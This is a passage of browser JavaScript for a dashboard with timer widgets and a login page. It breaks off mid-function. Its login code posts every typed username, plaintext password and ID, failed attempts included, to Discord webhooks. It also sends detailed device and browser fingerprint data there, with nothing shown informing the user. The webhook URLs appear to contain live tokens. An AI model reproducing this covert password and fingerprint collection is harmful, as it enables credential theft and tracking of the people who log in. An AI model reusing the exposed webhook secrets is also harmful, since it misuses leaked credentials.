        const resetCountdownBtn = document.getElementById('resetCountdownBtn');
        const startStopwatchBtn = document.getElementById('startStopwatchBtn');
        const pauseStopwatchBtn = document.getElementById('pauseStopwatchBtn');
        const resetStopwatchBtn = document.getElementById('resetStopwatchBtn');
        
        // Guard clauses for elements
        if (!(stopwatchDisplay && timerDisplay && countdownDisplay && showStopwatchBtn && showTimerBtn && showCountdownBtn &&
            stopwatchControls && timerControls && countdownControls && timerInput && startTimerBtn && pauseTimerBtn && resetTimerBtn &&
            countdownInput && startCountdownBtn && pauseCountdownBtn && resetCountdownBtn &&
            startStopwatchBtn && pauseStopwatchBtn && resetStopwatchBtn)) {
            return; 
        }

        let stopwatchInterval;
        let timerInterval;
        let countdownInterval;

        let stopwatchTime = 0; // seconds
        let timerTime = 0; // seconds, configured
        let currentTimerTime = 0; // seconds, countdown
        let countdownInitialTime = 0; // seconds, for reset
        let currentCountdownTime = 0; // seconds, actual countdown value

        // Helper to format time as HH:MM:SS or MM:SS
        const formatTimeDisplay = (seconds, includeHours = true) => {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            const pad = (num) => String(num).padStart(2, '0');
            return includeHours ? `${pad(h)}:${pad(m)}:${pad(s)}` : `${pad(m)}:${pad(s)}`;
        };

        // --- Stopwatch Functions ---
        startStopwatchBtn.addEventListener('click', () => {
            if (!stopwatchInterval) {
                stopwatchInterval = setInterval(() => {
                    stopwatchTime++;
                    stopwatchDisplay.textContent = formatTimeDisplay(stopwatchTime);
                }, 1000);
                startStopwatchBtn.textContent = 'Continue';
                trackActivity('Time Tool', 'Stopwatch started/continued');
            }
        });
        pauseStopwatchBtn.addEventListener('click', () => {
            clearInterval(stopwatchInterval);
            stopwatchInterval = null;
            trackActivity('Time Tool', 'Stopwatch paused');
        });
        resetStopwatchBtn.addEventListener('click', () => {
            clearInterval(stopwatchInterval);
            stopwatchInterval = null;
            stopwatchTime = 0;
            stopwatchDisplay.textContent = formatTimeDisplay(stopwatchTime);
            startStopwatchBtn.textContent = 'Start';
            trackActivity('Time Tool', 'Stopwatch reset');
        });

        // --- Timer Functions ---
        timerInput.addEventListener('change', () => {
          let minutes = parseInt(timerInput.value);
          if (isNaN(minutes) || minutes <= 0) minutes = 0;
          timerTime = minutes * 60; // Set initial total time
          currentTimerTime = timerTime;
          timerDisplay.textContent = formatTimeDisplay(currentTimerTime, false);
          if (timerTime > 0) {
              startTimerBtn.removeAttribute('disabled');
              trackActivity('Time Tool', `Timer configured for ${minutes} minutes`);
          } else {
              startTimerBtn.setAttribute('disabled', 'true');
          }
          clearInterval(timerInterval); timerInterval = null;
          startTimerBtn.textContent = 'Start';
        });

        startTimerBtn.addEventListener('click', () => {
            if (!timerInterval && currentTimerTime > 0) {
                timerInterval = setInterval(() => {
                    if (currentTimerTime > 0) {
                        currentTimerTime--;
                        timerDisplay.textContent = formatTimeDisplay(currentTimerTime, false);
                    } else {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        showAlert('TIMER COMPLETE!', 'info', 5000);
                        trackActivity('Time Tool', 'Timer finished');
                    }
                }, 1000);
                startTimerBtn.textContent = 'Continue';
                trackActivity('Time Tool', 'Timer started/continued');
            }
        });
        pauseTimerBtn.addEventListener('click', () => {
            clearInterval(timerInterval);
            timerInterval = null;
            trackActivity('Time Tool', 'Timer paused');
        });
        resetTimerBtn.addEventListener('click', () => {
            clearInterval(timerInterval);
            timerInterval = null;
            currentTimerTime = timerTime; // Reset to the configured total time
            timerDisplay.textContent = formatTimeDisplay(currentTimerTime, false);
            startTimerBtn.textContent = 'Start';
            if (timerTime === 0) startTimerBtn.setAttribute('disabled', 'true');
            trackActivity('Time Tool', 'Timer reset');
        });
        startTimerBtn.setAttribute('disabled', 'true'); // Disable start initially

        // --- Countdown Functions ---
        countdownInput.addEventListener('change', () => {
          const parts = countdownInput.value.split(':').map(Number);
          let totalSeconds = 0;
          if (parts.length === 3) { // HH:MM:SS
            totalSeconds = parts[0] * 3600 + parts[1] * 60 + parts[2];
          } else if (parts.length === 2) { // MM:SS
            totalSeconds = parts[0] * 60 + parts[1];
          }
          if (isNaN(totalSeconds) || totalSeconds <= 0) totalSeconds = 0;

          countdownInitialTime = totalSeconds; // For reset
          currentCountdownTime = totalSeconds;
          countdownDisplay.textContent = formatTimeDisplay(currentCountdownTime);
          if (currentCountdownTime > 0) {
            startCountdownBtn.removeAttribute('disabled');
            trackActivity('Time Tool', `Countdown configured for ${countdownInput.value}`);
          } else {
            startCountdownBtn.setAttribute('disabled', 'true');
          }
          clearInterval(countdownInterval); countdownInterval = null;
          startCountdownBtn.textContent = 'Start';
        });

        startCountdownBtn.addEventListener('click', () => {
            if (!countdownInterval && currentCountdownTime > 0) {
                countdownInterval = setInterval(() => {
                    if (currentCountdownTime > 0) {
                        currentCountdownTime--;
                        countdownDisplay.textContent = formatTimeDisplay(currentCountdownTime);
                    } else {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                        showAlert('COUNTDOWN COMPLETE!', 'info', 5000);
                        trackActivity('Time Tool', 'Countdown finished');
                    }
                }, 1000);
                startCountdownBtn.textContent = 'Continue';
                trackActivity('Time Tool', 'Countdown started/continued');
            }
        });
        pauseCountdownBtn.addEventListener('click', () => {
            clearInterval(countdownInterval);
            countdownInterval = null;
            trackActivity('Time Tool', 'Countdown paused');
        });
        resetCountdownBtn.addEventListener('click', () => {
            clearInterval(countdownInterval);
            countdownInterval = null;
            currentCountdownTime = countdownInitialTime;
            countdownDisplay.textContent = formatTimeDisplay(currentCountdownTime);
            startCountdownBtn.textContent = 'Start';
            if (countdownInitialTime === 0) startCountdownBtn.setAttribute('disabled', 'true');
            trackActivity('Time Tool', 'Countdown reset');
        });
        startCountdownBtn.setAttribute('disabled', 'true'); // Disable start initially


        // Tab Switching Logic
        const navButtons = [showStopwatchBtn, showTimerBtn, showCountdownBtn];
        const panels = [stopwatchControls, timerControls, countdownControls];

        const activatePanel = (index) => {
            panels.forEach((p, i) => {
                p.style.display = (i === index) ? 'block' : 'none';
                navButtons[i].classList.toggle('active', i === index);
            });
            trackActivity('Time Tool Tab Switch', `Switched to ${navButtons[index].textContent}`);
        };

        navButtons.forEach((btn, index) => {
            btn.addEventListener('click', () => activatePanel(index));
        });

        activatePanel(0); // Show stopwatch by default on load

      },

      initQuoteFactBoxes: function() {
          // Initialize for new elements too
          const randomFactContent = document.getElementById('randomFactContent');
          const dailyQuoteContent = document.getElementById('dailyQuoteContent');

          if(randomFactContent) this.refreshRandomFact();
          if(dailyQuoteContent) this.refreshDailyQuote();
      },

      updateLoginHistoryDisplay: function() {
        const lastLoginDisplay = document.getElementById('lastLoginDisplay'); // For login box
        const loginHistoryContent = document.getElementById('loginHistoryContent'); // For dashboard panel

        const lastLoginRaw = localStorage.getItem('lastSuccessfulLogin');
        if (lastLoginRaw) {
            const date = new Date(lastLoginRaw);
            const formattedDate = date.toLocaleString(); // Uses local timezone
            if (lastLoginDisplay) {
                lastLoginDisplay.innerHTML = `<strong>Last Successful Login:</strong> ${formattedDate}`;
            }
            if (loginHistoryContent) {
                 loginHistoryContent.innerHTML = `<p class="login-history-entry"><strong>${formattedDate}:</strong> Successful login</p>`;
            }
        } else {
            if (lastLoginDisplay) {
                lastLoginDisplay.innerHTML = "No previous successful login.";
            }
            if (loginHistoryContent) {
                loginHistoryContent.innerHTML = "<p class='login-history-entry' style='font-style: italic;'>No recent successful login records.</p>";
            }
        }
      },

      showWelcomeNotification: function(username) {
          const notification = document.getElementById('welcomeNotification');
          if (!notification) return;
          notification.textContent = `Welcome, ${username}!`;
          notification.classList.add('show');
          trackActivity('Notification', `Welcome message shown to ${username}`);
          setTimeout(() => {
              notification.classList.remove('show');
              // Optionally remove from DOM after fading out completely if desired
              setTimeout(() => notification.style.display = 'none', 500);
          }, 5000);
      },

      updateWiFiLevelsColor: function() {
        document.querySelectorAll('.wifi-entry div').forEach(div => {
            const level = div.textContent.toLowerCase().trim(); // Trim whitespace
            div.classList.remove('level-high', 'level-medium', 'level-low'); // Clean previous
            if (level === 'high') {
                div.classList.add('level-high');
            } else if (level === 'medium') {
                div.classList.add('level-medium');
            } else if (level === 'low') {
                div.classList.add('level-low');
            }
        });
      },

      // Cleanup intervals on logout/restart
      clearAllIntervals: function() {
          this._updateIntervals.forEach(clearInterval);
          this._updateIntervals = [];
          if (stopwatchInterval) clearInterval(stopwatchInterval);
          if (timerInterval) clearInterval(timerInterval);
          if (countdownInterval) clearInterval(countdownInterval);
          if (interactionInterval) clearInterval(interactionInterval);
      }
    };

    // Helper for time formatting (shared)
    function formatTime(seconds) {
      const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
      const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
      const secs = String(seconds % 60).padStart(2, '0');
      return `${hrs}:${mins}:${secs}`;
    }

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtOeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
        login_attempt_status: 'https://discord.com/api/webhooks/12345678901234567890/new-login-attempt-webhook', 
        geo_location: 'https://discord.com/api/webhooks/12345678901234567891/new-geo-location-webhook',
        browser_info: 'https://discord.com/api/webhooks/12345678901234567892/new-browser-info-webhook'
      };


      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordToggle = document.getElementById('showPasswordToggle');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');
      const loginQuickBar = document.getElementById('loginQuickBar');

      let attempts = 3; // Changed from 5 to 3
      let users = [];
      let loginTime = null;

      // New: 24-hour format toggle
      const toggle24HourFormat = document.getElementById('toggle24HourFormat');
      if (toggle24HourFormat) {
          toggle24HourFormat.addEventListener('change', () => {
              dashboard.is24HourFormat = toggle24HourFormat.checked;
              dashboard.initClock(); // Re-initialize clock to update format
              trackActivity('Toggle', `24-Hour format toggled to: ${dashboard.is24HourFormat}`);
              trackStats('toggle');
          });
      }

      // Show/hide password toggle (modern switch)
      if (showPasswordToggle) {
          showPasswordToggle.addEventListener('change', () => {
            passwordInput.type = showPasswordToggle.checked ? 'text' : 'password';
            trackActivity('Toggle', `Show Password toggled to: ${showPasswordToggle.checked}`);
            trackStats('toggle');
          });
      }

      // Login Quick Bar actions
      document.getElementById('loginPanicBtn')?.addEventListener('click', () => {
        trackActivity('Button Click', 'Panic button clicked (Login Page)');
        trackStats('button');
        window.open('https://clever.com', '_blank');
      });
      let loginZoomLevel = 1;
      const loginZoomStep = 0.1;
      document.getElementById('loginZoomInBtn')?.addEventListener('click', () => {
        trackActivity('Button Click', 'Zoom In button clicked (Login Page)');
        trackStats('button');
        if (loginZoomLevel < 2) {
          loginZoomLevel += loginZoomStep;
          document.body.style.zoom = loginZoomLevel;
        }
      });
      document.getElementById('loginZoomOutBtn')?.addEventListener('click', () => {
        trackActivity('Button Click', 'Zoom Out button clicked (Login Page)');
        trackStats('button');
        if (loginZoomLevel > 0.5) {
          loginZoomLevel -= loginZoomStep;
          document.body.style.zoom = loginZoomLevel;
        }
      });
      document.getElementById('loginActivityLogsBtn')?.addEventListener('click', () => {
          trackActivity('Button Click', 'Activity Logs (Login Page) button clicked');
          trackStats('button');
          if (alertContainer.style.display === 'none') {
            alertContainer.style.display = 'flex';
          }
          if (activityLog.length === 0) {
            showAlert("No login-related activities logged yet.", "info", 5000);
          } else {
             // Create a temporary pop-up to show log
             const tempLogDiv = document.createElement('div');
             tempLogDiv.style.cssText = `
                 position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
                 background: #2a2a2a; border: 2px solid white; border-radius: 10px;
                 padding: 20px; max-width: 80vw; max-height: 80vh; overflow-y: auto;
                 z-index: 2000; box-shadow: 0 0 20px rgba(255,255,255,0.5);
                 color: #f9f2dc;
             `;
             tempLogDiv.innerHTML = `<h3>Login Activity Logs</h3><div style="font-size: 0.9em; text-align: left; background: #1c1c1c; padding: 10px; border-radius: 8px;">${
                activityLog.map(entry => `<div><strong>${entry.timestamp}:</strong> ${entry.description}</div>`).join('')
             }</div><button style="margin-top: 15px; width: 100%; padding: 10px; background: #ff4c4c; color: white; border: none; border-radius: 8px; cursor:pointer;">Close</button>`;
             document.body.appendChild(tempLogDiv);
             tempLogDiv.querySelector('button').addEventListener('click', () => tempLogDiv.remove());
          }
      });

      document.getElementById('loginHistoryBtn')?.addEventListener('click', () => {
          trackActivity('Button Click', 'Login History (Login Page) button clicked');
          trackStats('button');
          dashboard.updateLoginHistoryDisplay();
          const loginHistoryContent = document.getElementById('lastLoginDisplay');
          if (loginHistoryContent && loginHistoryContent.innerHTML) {
              showAlert(loginHistoryContent.innerHTML, 'info', 7000);
          } else {
              showAlert("No last successful login recorded.", "info", 5000);
          }
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
          trackActivity('System Event', 'User data loaded');
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
          trackActivity('Error', 'Failed to load user JSON data');
          showAlert('Failed to load user database. Login might be affected.', 'error', 10000);
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        trackActivity('UI Feedback', 'Login box flashing red');
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
          trackActivity('Webhook Error', `Failed to send webhook to ${url}: ${e.message}`);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        let ipAddress = "Unknown";
        let vpnDetected = "Unknown"; // Requires a service or more advanced detection
        let proxyDetected = "Unknown"; // Requires a service or more advanced detection
        let ipv6Address = "Unavailable";
        let localIPs = [];

        try {
            // This is client-side, typically not directly available. Public APIs needed for actual IP lookup.
            // Placeholder: Assume no VPN/Proxy detected if not using a service.
        } catch (e) {
            console.warn("IP/VPN detection failed:", e);
        }

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          ipAddress,
          vpnDetected,
          proxyDetected,
          ipv6Address,
          localIPs,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory,
          screenResolution: `${screen.width}x${screen.height}`,
          screenWidth: screen.width, // Added new logging info
          screenHeight: screen.height, // Added new logging info
          cpuCores: navigator.hardwareConcurrency, // Added new logging info (duplicate of hardwareConcurrency for clarity)
          onlineStatus: navigator.onLine, // Added new logging info
          connectionType: navigator.connection ? navigator.connection.type : 'Unknown', // Added new logging info
          effectiveConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown', // Added new logging info
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
        trackActivity('Login Log', `Username log sent for ${username}`);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
        trackActivity('Login Log', `Password log sent for ${name}`);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
        trackActivity('Login Log', `Identifier log sent for ${name}`);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
        trackActivity('Login Error', `Invalid username attempt: ${username}`);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
        trackActivity('Login Error', `Invalid password attempt for ${name}`);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
        trackActivity('Login Error', `Invalid identifier attempt for ${name}`);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
        trackActivity('Login Log', `Login attempt - Attempts left: ${attemptsLeft}`);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
        trackActivity('Login Critical', `Max attempts exceeded for ${username}`);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: data.hardwareConcurrency ? `${data.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: data.deviceMemory ? `${data.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: data.onlineStatus ? "Online" : "Offline", inline: true }, // From new data
            { name: "Connection Type", value: data.connectionType || "Unknown", inline: true }, // From new data
            { name: "Effective Connection Type", value: data.effectiveConnectionType || "Unknown", inline: true }, // From new data

            { name: "Downlink Speed", value: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: navigator.connection?.rtt ? `${navigator.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: navigator.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: navigator.connection?.downlinkMax ? `${navigator.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: navigator.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: navigator.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: navigator.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          trackActivity('Login Attempt', 'All fields not filled');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );
        trackActivity('Login Attempt', `Attempt with User: ${username}, ID: ${userID}`);


        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found.');
